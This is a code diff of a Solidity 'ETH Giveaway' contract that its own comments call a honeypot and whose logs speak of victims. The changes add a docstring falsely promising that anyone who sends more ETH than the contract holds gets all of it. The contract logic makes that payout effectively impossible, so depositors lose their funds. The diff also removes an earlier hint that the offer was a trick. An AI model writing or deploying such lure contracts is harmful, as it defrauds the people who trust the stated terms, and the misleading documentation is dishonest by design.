@@ -6,30 +6,32 @@ import "hardhat/console.sol";
 
 contract ETH_Giveaway
 {
-    // This is a ETH giveway, take all the contract ETH !! (If you can) test
-    
+    // This is a ETH giveway !
+
     address public owner;
     
     constructor (address _owner) payable {
-        console.log("Setting the owner");
+        // Setting the HoneyPot Owner
         owner = _owner;
     }
     
     function viewGameBalance () public view returns (uint) {
-        return address(this).balance;
-        
+        return address(this).balance;   
     }
-
     
+    /**
+        ETH "Giveaway":
+
+        If the giveaway caller sends more eth than the contract already has,
+        The contract transfer all the eth to the caller
+    */
     function giveway(address _reciever) public payable{
-        console.log("Victim deposits %s", msg.value);
+        console.log("Victim %s deposits %s", msg.sender, msg.value);
         
         require(msg.value > 0, "Error");
         console.log("Honeypot Balance is now: %s", address(this).balance);
         if(msg.value >= address(this).balance){
-            
             payable(_reciever).transfer(address(this).balance + msg.value);
-            
         }
 
     }
